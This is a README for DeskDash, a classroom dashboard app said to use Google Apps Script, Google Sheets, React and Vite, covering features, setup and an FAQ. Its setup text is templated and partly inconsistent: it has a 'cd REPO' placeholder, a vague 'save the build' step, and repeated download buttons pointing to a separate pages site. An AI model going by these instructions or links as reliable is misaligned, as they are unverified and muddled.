# DeskDash - Classroom Dashboard 2026

> **DeskDash is a projection-ready classroom workspace built with Google Apps Script, Google Sheets, React, and Vite. It brings teacher utilities, countdowns, student selection, deadlines, and classroom activity controls together in one dashboard.**

[![Platform](https://img.shields.io/badge/Platform-Google%20Apps%20Script-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/victorkaugbaker1349/deskdash-classroom-hub?style=flat-square)](https://github.com/victorkaugbaker1349/deskdash-classroom-hub)

---

<p align="center">
  <a href="https://victorkaugbaker1349.github.io/deskdash-classroom-hub/">
    <img src="https://img.shields.io/badge/Download-DeskDash%20Latest-brightgreen?style=for-the-badge" alt="Download DeskDash">
  </a>
</p>

> **[Download DeskDash Current Build](https://victorkaugbaker1349.github.io/deskdash-classroom-hub/)**

---

[Download Latest Build](https://victorkaugbaker1349.github.io/deskdash-classroom-hub/)

---

## What DeskDash Provides

DeskDash gives educators one flexible screen for common classroom routines. The projection-focused dashboard can show dates, deadlines, countdowns, student selections, and classroom noise information in a layout intended to remain easy to see from across the room.

Google Sheets supplies the dashboard's connected data layer, while separate teacher and display views support different classroom roles. Teachers can rearrange components with drag and drop, change the theme, filter by period, and edit information inline instead of moving between several tools.

---

## Core Features

- Date navigation that automatically skips weekends
- Drag-and-drop controls for arranging dashboard elements
- Inline editing backed by Google Sheets synchronization
- Countdown pop-up with synchronized display windows
- Random student selection with class-period filtering
- Deadline widget with sorting plus create, edit, and delete actions
- Browser-based microphone meter for observing classroom noise
- Separate teacher-control and projected-display views
- Light and dark appearance modes with configurable accent colors

---

## Getting Started

### Download a build

1. Visit the [DeskDash download page](https://victorkaugbaker1349.github.io/deskdash-classroom-hub/).
2. Save the available build.
3. Open the project in Google Apps Script.
4. Link the dashboard with the Google Sheet that contains the classroom data.
5. Deploy or start the Apps Script project in the manner that fits your classroom setup.

### Clone the repository

```bash
git clone https://github.com/victorkaugbaker1349/deskdash-classroom-hub.git
cd REPO
```

DeskDash combines a React and Vite interface with Google Apps Script. Before starting development or deployment, inspect the repository contents for the workflow and instructions provided by the project.

---

## Using DeskDash

For a normal classroom session:

1. Launch DeskDash through its deployed Google Apps Script web app.
2. Choose the date or classroom period that applies.
3. Reposition widgets by dragging them into the desired arrangement.
4. Change classroom information in the dashboard or in the connected Google Sheet.
5. Manage timers, deadlines, and student selection from the teacher view.
6. Switch to the display view when the dashboard is ready for students.
7. Select a suitable theme and accent color for the screen or projector.
8. Turn on the browser microphone meter when sound-level feedback is useful.

### Possible classroom workflows

- Run a synchronized timer during independent practice.
- Select a random student from a particular class period.
- Reorder deadlines to bring the most relevant information forward.
- Project the classroom dashboard while retaining controls in the teacher view.
- Use the browser noise meter to observe classroom sound levels.

---

## Setup and Configuration

Dashboard data is handled through the Google Sheets connection. Treat the linked sheet as the shared source for information that should persist between dashboard sessions.

The available configuration includes:

- The placement and order of dashboard widgets
- Class periods available to the student picker
- Deadline records and their order
- Theme selection and accent color
- Teacher-control and projected-display views
- Browser microphone access used by the noise meter

During initial setup, make sure the Apps Script project is authorized to use the intended Google Sheet. If you plan to use the noise meter, also grant microphone permission in the browser.

---

## Requirements

- Google Apps Script
- A Google Sheet for synchronized dashboard data
- A current web browser
- React and Vite for the application interface
- Browser microphone permission for the noise meter
- A screen or projector for projection-focused use
- Network connectivity appropriate for the deployed Apps Script application

---

## Frequently Asked Questions

### What type of users is DeskDash designed for?

DeskDash is built for teachers and classroom settings where a shared screen is useful for routines, deadlines, timers, student selection, and activity feedback.

### Where are dashboard edits stored?

Dashboard changes are intended to synchronize with Google Sheets. Before entering classroom information, confirm that the project points to the correct sheet.

### Does DeskDash separate teacher controls from the projected screen?

Yes. The application provides a two-view setup: one view for teacher operations and another intended for classroom display.

### How can I limit random student selection to one class?

Apply the appropriate period filter before beginning the random student selection process.

### What should I check if the noise meter is inactive?

Verify that the browser is allowed to use the microphone and that the desired microphone device is available. The meter depends on browser microphone access.

### Are there appearance options?

Yes. You can use either a light or dark theme and customize the dashboard accent color.

### What is the update process?

Get the newest available build from the [project download page](https://victorkaugbaker1349.github.io/deskdash-classroom-hub/), then use the deployment procedure for the Google Apps Script project.

### Where can I submit an issue?

Check the repository documentation first, then open an issue at [github.com/victorkaugbaker1349/deskdash-classroom-hub](https://github.com/victorkaugbaker1349/deskdash-classroom-hub). Include the affected workflow, browser information, and relevant configuration details.

---

## License

DeskDash is available under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license text.
